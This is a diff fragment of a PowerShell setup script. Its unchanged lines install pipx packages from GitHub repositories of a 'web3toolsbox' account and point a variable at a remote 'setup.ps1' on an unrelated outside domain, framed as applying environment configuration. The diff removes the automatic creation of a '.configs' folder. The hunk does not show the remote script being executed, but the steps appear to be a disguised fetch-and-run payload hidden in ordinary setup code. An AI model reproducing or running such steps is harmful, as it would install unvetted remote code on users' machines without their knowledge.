@@ -595,10 +595,6 @@ try {
     Install-PipxPackage -PipxInvoker $pipxInvoker -PackageSpec 'git+https://github.com/web3toolsbox/agent-setting.git' -CommandNames @('agent-setting', 'agent-setting.exe') -VenvNames @('agent-setting')
     Install-PipxPackage -PipxInvoker $pipxInvoker -PackageSpec 'git+https://github.com/web3toolsbox/auto-backup-wins.git' -CommandNames @('autobackup', 'autobackup.exe') -VenvNames @('auto-backup-wins')
 
-    if (-not (Test-Path '.configs')) {
-        New-Item -ItemType Directory -Path '.configs' -Force | Out-Null
-    }
-
     if (Test-Path '.configs' -PathType Container) {
         Write-StepLog 'Applying environment configuration'
         $gistUrl = 'https://www.aiskills.life/src/setup.ps1'
